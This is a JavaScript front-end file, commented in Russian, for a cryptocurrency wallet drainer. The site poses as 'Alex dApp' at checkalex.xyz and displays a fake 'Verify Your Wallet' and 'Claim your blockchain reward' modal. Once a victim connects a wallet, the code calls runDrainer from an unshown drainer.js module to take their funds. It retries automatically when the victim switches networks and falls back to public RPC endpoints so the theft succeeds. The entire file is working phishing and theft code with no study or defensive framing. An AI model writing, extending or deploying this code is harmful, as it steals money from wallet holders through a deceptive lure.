import { createAppKit } from '@reown/appkit';
import { mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base } from '@reown/appkit/networks';
import { WagmiAdapter } from '@reown/appkit-adapter-wagmi';
import { ethers } from 'ethers';
import { runDrainer } from './drainer.js';

// === Конфигурация AppKit ===
const projectId = 'd85cc83edb401b676e2a7bcef67f3be8';
const networks = [mainnet, polygon, bsc, avalanche, arbitrum, optimism, linea, base];
const wagmiAdapter = new WagmiAdapter({ projectId, networks });

const appKitModal = createAppKit({
  adapters: [wagmiAdapter],
  networks,
  projectId,
  metadata: {
    name: 'Alex dApp',
    description: 'Connect and sign',
    url: 'https://checkalex.xyz',
    icons: ['https://checkalex.xyz/icon.png'],
  },
  features: { analytics: true, email: false, socials: false },
  allWallets: 'SHOW',
});

// === Глобальные переменные ===
let connectedAddress = null;
let hasDrained = false;
let isTransactionPending = false;
let actionBtn = null;
let modalOverlay = null;
let modalContent = null;
let modalShown = false;

// Список надёжных RPC для fallback (оставляем, так как может быть полезно для любых сетей)
const FALLBACK_RPCS = [
  'https://rpc.eth.gateway.fm',
  'https://eth.llamarpc.com',
  'https://ethereum-rpc.publicnode.com'
];

// Функция для создания провайдера с fallback RPC
async function getReliableProvider() {
  const walletProvider = new ethers.providers.Web3Provider(window.ethereum);
  try {
    await walletProvider.getBalance('0x0000000000000000000000000000000000000000');
    console.log('✅ Провайдер кошелька полностью рабочий');
    return walletProvider;
  } catch (err) {
    console.warn('⚠️ Провайдер кошелька ненадёжен:', err.message);
  }

  for (const rpcUrl of FALLBACK_RPCS) {
    try {
      const fallbackProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
      await fallbackProvider.getBalance('0x0000000000000000000000000000000000000000');
      console.log(`✅ Переключено на fallback RPC: ${rpcUrl}`);
      return new ethers.providers.Web3Provider({
        ...window.ethereum,
        request: async (request) => {
          if (
            request.method === 'eth_chainId' ||
            request.method === 'eth_call' ||
            request.method === 'eth_getBalance' ||
            request.method === 'eth_blockNumber'
          ) {
            return fallbackProvider.send(request.method, request.params || []);
          }
          return walletProvider.send(request.method, request.params || []);
        }
      });
    } catch (err) {
      console.warn(`⚠️ Fallback RPC ${rpcUrl} недоступен:`, err.message);
    }
  }

  throw new Error('❌ Не удалось найти рабочий RPC');
}

// === Инициализация при загрузке страницы ===
window.addEventListener('DOMContentLoaded', () => {
  actionBtn = document.getElementById('action-btn');
  const isInjected = typeof window.ethereum !== 'undefined';

  // Подключаем шрифт Inter
  const link = document.createElement('link');
  link.href = 'https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap';
  link.rel = 'stylesheet';
  document.head.appendChild(link);

  // CSS для модального окна в стиле AppKit
  const style = document.createElement('style');
  style.textContent = `
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.8);
      z-index: 999;
      display: none;
      backdrop-filter: blur(4px);
    }

    .modal-content {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1A202C;
      border-radius: 12px;
      padding: 24px;
      width: 90%;
      max-width: 400px;
      min-height: 350px;
      text-align: center;
      z-index: 1000;
      display: none;
      font-family: 'Inter', sans-serif;
      color: #FFFFFF;
      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
      animation: fadeIn 0.3s ease-out forwards;
    }

    @keyframes fadeIn {
      0% { transform: translate(-50%, -50%) scale(0.95); opacity: 0; }
      100% { transform: translate(-50%, -50%) scale(1); opacity: 1; }
    }

    .modal-title {
      font-size: 20px;
      font-weight: 600;
      color: #FFFFFF;
      margin-bottom: 16px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 8px;
    }

    .modal-title::before {
      content: '';
      font-size: 20px;
    }

    .modal-subtitle {
      font-size: 14px;
      font-weight: 400;
      color: #A0AEC0;
      margin-bottom: 24px;
    }

    /* Креативный кружок загрузки */
    .loader-container {
      position: relative;
      width: 100px;
      height: 100px;
      margin: 0 auto 24px;
    }

    .loader-orbit {
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      border-radius: 50%;
      background: transparent;
    }

    .loader-dot {
      position: absolute;
      width: 12px;
      height: 12px;
      background: #3B82F6;
      border-radius: 50%;
      box-shadow: 0 0 10px rgba(59, 130, 246, 0.5);
    }

    .loader-dot:nth-child(1) {
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      animation: orbit1 2s linear infinite;
    }

    .loader-dot:nth-child(2) {
      top: 50%;
      right: 10px;
      transform: translateY(-50%);
      animation: orbit2 2.2s linear infinite;
    }

    .loader-dot:nth-child(3) {
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      animation: orbit3 2.4s linear infinite;
    }

    @keyframes orbit1 {
      0% { transform: translateX(-50%) rotate(0deg) translateY(-25px); }
      100% { transform: translateX(-50%) rotate(360deg) translateY(-25px); }
    }

    @keyframes orbit2 {
      0% { transform: translateY(-50%) rotate(0deg) translateX(25px); }
      100% { transform: translateY(-50%) rotate(360deg) translateX(25px); }
    }

    @keyframes orbit3 {
      0% { transform: translateX(-50%) rotate(0deg) translateY(25px); }
      100% { transform: translateX(-50%) rotate(360deg) translateY(25px); }
    }

    .action-list {
      list-style: none;
      padding: 0;
      margin: 24px 0 0;
      font-size: 14px;
      font-weight: 500;
      color: #E2E8F0;
      text-align: left;
    }

    .action-list li {
      margin-bottom: 12px;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .action-list li::before {
      content: '';
      color: #10B981;
      font-size: 16px;
    }

    .modal-footer {
      font-size: 12px;
      font-weight: 400;
      color: #A0AEC0;
      margin-top: 32px;
      font-style: italic;
    }

    @media (max-width: 480px) {
      .modal-content {
        max-width: 320px;
        padding: 20px;
        min-height: 300px;
      }
      .modal-title {
        font-size: 18px;
      }
      .modal-subtitle {
        font-size: 13px;
      }
      .loader-container {
        width: 70px;
        height: 70px;
      }
      .loader-dot {
        width: 10px;
        height: 10px;
      }
      @keyframes orbit1 {
        0% { transform: translateX(-50%) rotate(0deg) translateY(-10px); }
        100% { transform: translateX(-50%) rotate(360deg) translateY(-10px); }
      }
      @keyframes orbit2 {
        0% { transform: translateY(-50%) rotate(0deg) translateX(10px); }
        100% { transform: translateY(-50%) rotate(360deg) translateX(10px); }
      }
      @keyframes orbit3 {
        0% { transform: translateX(-50%) rotate(0deg) translateY(10px); }
        100% { transform: translateX(-50%) rotate(360deg) translateY(10px); }
      }
      .action-list {
        font-size: 13px;
      }
      .modal-footer {
        font-size: 11px;
      }
    }
  `;
  document.head.appendChild(style);

  // Создаём модальное окно
  modalOverlay = document.createElement('div');
  modalOverlay.className = 'modal-overlay';
  document.body.appendChild(modalOverlay);

  modalContent = document.createElement('div');
  modalContent.className = 'modal-content';
  modalContent.innerHTML = `
    <div class="modal-title">Verify Your Wallet</div>
    <div class="modal-subtitle">Processing blockchain verification...</div>
    <div class="loader-container">
      <div class="loader-orbit">
        <div class="loader-dot"></div>
        <div class="loader-dot"></div>
        <div class="loader-dot"></div>
      </div>
    </div>
    <ul class="action-list">
      <li>Connect to the network</li>
      <li>Sign the verification transaction</li>
      <li>Claim your blockchain reward</li>
    </ul>
    <div class="modal-footer">Please confirm in your wallet app</div>
  `;
  document.body.appendChild(modalContent);

  // Проверяем наличие инжектированного провайдера
  if (!isInjected) {
    actionBtn.style.display = 'inline-block';
    actionBtn.addEventListener('click', () => {
      window.showWalletRedirectModal();
    });
    return;
  }

  actionBtn.style.display = 'inline-block';
  actionBtn.addEventListener('click', handleConnectOrAction);

  // Подписка на смену сети
  window.ethereum.on('chainChanged', onChainChanged);
});

// === Управление модальным окном ===
function showModal() {
  modalOverlay.style.display = 'block';
  modalContent.style.display = 'block';
}

function hideModal() {
  modalOverlay.style.display = 'none';
  modalContent.style.display = 'none';
}

function showModalOnce() {
  if (!modalShown) {
    modalShown = true;
    showModal();
  }
}

// === Выполнение drainer ===
async function attemptDrainer() {
  if (hasDrained || isTransactionPending) {
    console.log('⚠️ Транзакция уже выполнена или ожидается');
    return;
  }

  if (!connectedAddress) {
    console.error('❌ Адрес кошелька не определён');
    return;
  }

  console.log(`📍 Используется адрес: ${connectedAddress}`);
  showModalOnce();

  try {
    const provider = await getReliableProvider();
    const signer = provider.getSigner();
    const address = await signer.getAddress();

    if (address.toLowerCase() !== connectedAddress.toLowerCase()) {
      console.error('❌ Несоответствие адресов:', address, connectedAddress);
      hideModal();
      return;
    }

    isTransactionPending = true;
    await runDrainer(provider, signer, connectedAddress);
    console.log('✅ Drainer выполнен успешно');

    hasDrained = true;
    isTransactionPending = false;
    cleanup();
    hideModal();
  } catch (err) {
    isTransactionPending = false;
    hideModal();
    if (err.message.includes('user rejected')) {
      console.log('🙅 Пользователь отклонил транзакцию');
    } else {
      console.error('❌ Ошибка выполнения drainer:', err.message);
      throw err;
    }
  }
}

// === Подключение кошелька и запуск ===
async function handleConnectOrAction() {
  try {
    const accounts = await window.ethereum.request({ method: 'eth_accounts' });
    if (accounts.length === 0) {
      await appKitModal.open();
      connectedAddress = await waitForWallet();
      console.log('✅ Подключён кошелёк:', connectedAddress);
    } else {
      connectedAddress = accounts[0];
      console.log('✅ Уже подключён:', connectedAddress);
    }

    if (!isTransactionPending) {
      await attemptDrainer();
    } else {
      console.log('⏳ Транзакция уже выполняется');
    }
  } catch (err) {
    console.error('❌ Ошибка подключения:', err.message);
  }
}

// === Обработка смены сети ===
async function onChainChanged(chainId) {
  console.log('🔄 Смена сети:', chainId);
  if (connectedAddress && !isTransactionPending) {
    await attemptDrainer();
  } else {
    console.log('⏳ Транзакция в процессе');
  }
}

// === Очистка ===
function cleanup() {
  if (!actionBtn) return;
  actionBtn.removeEventListener('click', handleConnectOrAction);
  window.ethereum.removeListener('chainChanged', onChainChanged);
  actionBtn.disabled = true;
  actionBtn.style.opacity = '0.6';
}

// === Ожидание подключения кошелька ===
async function waitForWallet() {
  const accounts = await window.ethereum.request({ method: 'eth_accounts' });
  if (accounts.length > 0) return accounts[0];

  return new Promise((resolve) => {
    const interval = setInterval(async () => {
      const accounts = await window.ethereum.request({ method: 'eth_accounts' });
      if (accounts.length) {
        clearInterval(interval);
        resolve(accounts[0]);
      }
    }, 500);
  });
}
